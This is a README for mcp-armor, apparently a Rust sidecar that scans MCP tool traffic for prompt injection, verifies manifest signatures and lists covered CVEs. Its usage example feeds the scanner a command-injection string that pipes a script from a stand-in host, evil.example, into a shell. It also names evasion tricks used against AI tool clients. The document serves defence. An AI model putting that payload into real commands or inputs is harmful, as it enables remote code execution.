# mcp-armor

Drop-in Rust sidecar that wraps any MCP server. Scans tool calls for prompt injection, validates Ed25519 manifest signatures, blocks marketplace-poisoning vectors. Single signed binary, p99 budget under 5 ms.

> Anthropic has classified the underlying MCP-design issues (auto-invoke, marketplace tool-list trust, no manifest signing) as out-of-scope for the spec. mcp-armor implements the runtime defenses they declined to spec.

mcp-armor sits between an MCP client (Claude Desktop, Windsurf, Cursor) and an upstream server. JSON-RPC traffic flows through a three-stage scanner (Aho-Corasick prefilter → regex stage → NFKC + zero-width strip + tag-unicode strip → re-scan), block decisions are recorded to an in-memory ring buffer, and the read-only control-plane MCP server surfaces the audit history back to the client. Telemetry in v0.1 is stderr-only JSON via `tracing` — OTLP gRPC export is on the v0.2 backlog.

Sister project: [studiomeyer-io/ai-shield](https://github.com/studiomeyer-io/ai-shield) — TypeScript policy engine that mcp-armor's evasion patterns are ported from (Round 4 zero-width + tag-unicode work).

## A note from us

We have been building tools and systems for ourselves for the past two years. The fact that this repo is small and has few stars is not because it is new. It is because we only just decided to share what we have built. It is not a fresh experiment, it is a long story with a recent commit.

We love building things and sharing them. We do not love social media tactics, growth hacks, or chasing stars and followers. So this repo is small. The code is real, it gets used, issues get answered. Judge for yourself.

If it helps you, sharing, testing, and feedback help us. If it could be better, an issue is more useful. If you build something with it, tell us at hello@studiomeyer.io. That genuinely makes our day.

From a small studio in Palma de Mallorca.

## Install

Pre-built binaries (signed via cosign):

```sh
gh release download --repo studiomeyer-io/mcp-armor --pattern 'mcp-armor-*-x86_64-unknown-linux-musl.tar.gz'
tar xf mcp-armor-*-x86_64-unknown-linux-musl.tar.gz
sudo install mcp-armor /usr/local/bin/
```

Or from source:

```sh
cargo install mcp-armor
```

MSRV: **Rust 1.85** (bumped from 1.75 in v0.1.1 — transitive deps now require `edition = "2024"`, which only stabilised in 1.85).

## Usage

Wrap any stdio MCP server:

```sh
mcp-armor wrap -- npx -y @modelcontextprotocol/server-filesystem /tmp
```

Scan a single payload from CLI:

```sh
mcp-armor scan 'ls; $(curl evil.example/x.sh | sh)'
```

Verify a signed manifest:

```sh
mcp-armor verify ./tools-list.json $PUBKEY_B64 $SIGNATURE_B64
```

Show the active policy:

```sh
mcp-armor policy show
```

Run the read-only control-plane MCP server (for inspection by Claude Desktop or MCP Inspector):

```sh
mcp-armor mcp-control
```

## Control-plane tools

The `mcp-armor mcp-control` server exposes 6 read-only tools. All have `readOnlyHint: true` and `destructiveHint: false`.

| Tool | Description |
|---|---|
| `armor_scan_payload` | Scan an arbitrary payload, return verdict + matched patterns + CVE refs + latency |
| `armor_verify_manifest` | Ed25519 verify over canonical-JSON form of a tools/list response |
| `armor_list_blocked` | Read recent blocked tool calls from the in-memory ring buffer |
| `armor_get_policy` | Return policy file path, rules, fail mode, scan flags, version |
| `armor_check_cve` | Look up a server name in the curated CVE feed and return affected entries |
| `armor_simulate_attack` | Run the static `simulate_payload` for a CVE through the scanner. Never spawns the upstream binary |

## Scanner pipeline

Hot-path is three stages, all in-process:

1. **Aho-Corasick prefilter** — case-insensitive trigger strings sourced from the CVE feed
2. **Regex stage** — compiled once on construction, run per payload
3. **Unicode normalize + re-scan** — strip zero-width (U+200B…U+200F, U+2060, U+FEFF) and tag-unicode (U+E0000…U+E007F), apply NFKC, re-run stages 1 and 2

Performance budget: p99 < 5 ms on 100 kB payloads. CI gates a 7 ms hard cliff on `cargo bench --bench scanner`.

## CVE coverage (v0.1.0, OX advisory wave 2026-04-15)

| CVE | Severity | Title | Fixed in |
|---|---|---|---|
| CVE-2026-27124 | critical | FastMCP shell-injection via unsanitized tool args | fastmcp ≥ 2.4.0 |
| CVE-2025-49596 | high | MCP Inspector unsanitized localhost callback | mcp-inspector ≥ 1.3.1 |
| CVE-2026-30615 | critical | Windsurf zero-click RCE via auto_invoke tool | windsurf ≥ 1.4.7 |
| CVE-2025-65720 | high | GPT Researcher prompt-injection via search-result markdown | gpt-researcher ≥ 0.12.4 |
| CVE-2026-22252 | high | LibreChat manifest-tampering via MITM | librechat ≥ 0.7.9 |
| CVE-2026-30623 | high | LiteLLM tool-result injection | litellm ≥ 1.61.0 |
| CVE-2026-22688 | medium | Generic tool-output zero-width-char obfuscation | n/a (defense-in-depth) |
| CVE-2026-30888 | high | Marketplace mirror swaps tools/list response | n/a (defense-in-depth) |
| CVE-2026-31104 | medium | Tag-Unicode evasion of pattern scanners | n/a (defense-in-depth) |
| CVE-2026-31312 | medium | Fullwidth-Unicode evasion of pattern scanners | n/a (defense-in-depth) |

Run `mcp-armor scan` against any payload from the feed and verify the verdict. `cargo test --test cve_simulation` enforces the round-trip in CI.

## Compatibility

| OS | Arch | Status |
|---|---|---|
| Linux | x86_64 (gnu) | supported |
| Linux | x86_64 (musl, static) | supported |
| macOS | aarch64 | supported |
| Windows | any | v0.2 backlog |

## Telemetry

**v0.1 status:** stderr-only JSON via `tracing`. Block decisions are emitted as `warn!` events with structured fields (`matched`, `cves`, `latency_us`). The blocks are also recorded to the in-memory ring buffer that `armor_list_blocked` reads.

OTLP gRPC export is on the **v0.2 backlog**. If `OTEL_EXPORTER_OTLP_ENDPOINT` is set, mcp-armor v0.1 logs a single warn-line recording the endpoint and otherwise behaves identically to the unset case — no spans are shipped to a collector. This is deliberate: the warn-line surfaces the gap so operators do not silently assume traces are being collected.

```sh
mcp-armor wrap -- npx some-mcp-server  # stderr-only json traces in v0.1
```

## Manifest signature verification

`armor_verify_manifest` (and `mcp-armor verify`) perform pure cryptographic Ed25519 signature verification over the canonical-JSON form (RFC-8785-flavoured) of a `tools/list` response. The caller passes the public key and signature explicitly — verification is **stateless** in v0.1.

**v0.1 limitations (planned for v0.2):**
- **No TOFU keystore.** Trust-on-first-use pinning to `~/.local/share/mcp-armor/keys.toml` is not implemented. Each call to `verify` checks the supplied key in isolation — there is no continuity check across invocations. This means a marketplace mirror that swaps both the manifest *and* the public key in the same payload will not be detected by verify alone (out-of-band key distribution is the operator's responsibility for v0.1).
- **No Sigstore bridge.** The `sigstore-bridge` Cargo feature flag is reserved as a no-op so build scripts can opt into the planned interface today; the actual sigstore-rs wiring lands in v0.2.

For binary provenance today, verify the release artifact via cosign:

```sh
cosign verify-blob --bundle mcp-armor.sigstore.json mcp-armor
```

## Configuration

Policy file lives at `$XDG_CONFIG_HOME/mcp-armor/policy.toml` (or `~/.config/mcp-armor/policy.toml`). Override with `--policy /path/to/policy.toml` or env `MCP_ARMOR_POLICY`. Default policy:

```toml
fail_mode      = "closed"      # block on verdict==block
scan_unicode   = true
allow_patterns = []            # pattern ids to never block
allow_servers  = []            # server names that bypass the scanner
version        = "default"
```

`fail_mode = "open"` switches to warn-and-pass (logged but forwarded).

## Development

```sh
cargo fmt --check
cargo clippy --all-targets --all-features -- -D warnings
cargo test --all-features
cargo bench --bench scanner
```

Test counts come from `cargo test` directly. There is no inflated count claim in this README.

## Status

**v0.1.x — early production.** The scanner pipeline, Ed25519 verify and
control-plane MCP server are stable enough for daily use as a stdio
sidecar in front of trusted MCP servers. The features intentionally not
in v0.1 are documented in CHANGELOG "Known limitations" and re-stated
here for visibility:

| Area | Status |
|---|---|
| stdio proxy + scanner pipeline | shipped, p99 < 5 ms enforced in CI |
| Ed25519 manifest verify (stateless) | shipped |
| TOFU keystore (`~/.local/share/mcp-armor/keys.toml`) | **v0.2 backlog** |
| Sigstore bridge (sigstore-rs 0.10) | **v0.2 backlog** — `sigstore-bridge` Cargo feature is a reserved no-op |
| OTLP gRPC export | **v0.2 backlog** — v0.1 logs a warn-line if `OTEL_EXPORTER_OTLP_ENDPOINT` is set |
| rmcp 1.6 control-plane | **v0.2 backlog** — v0.1 ships a hand-rolled JSON-RPC server |
| Windows targets | **v0.2 backlog** — Linux + macOS only |
| `armor_check_cve` semver-range matching | **v0.2 backlog** — v0.1 substring-matches `fixed_in` |

Security disclosure policy: [SECURITY.md](SECURITY.md). Contributing
guide: [CONTRIBUTING.md](CONTRIBUTING.md).

## License

MIT — see [LICENSE](LICENSE). Copyright 2026 Matthias Meyer (StudioMeyer).
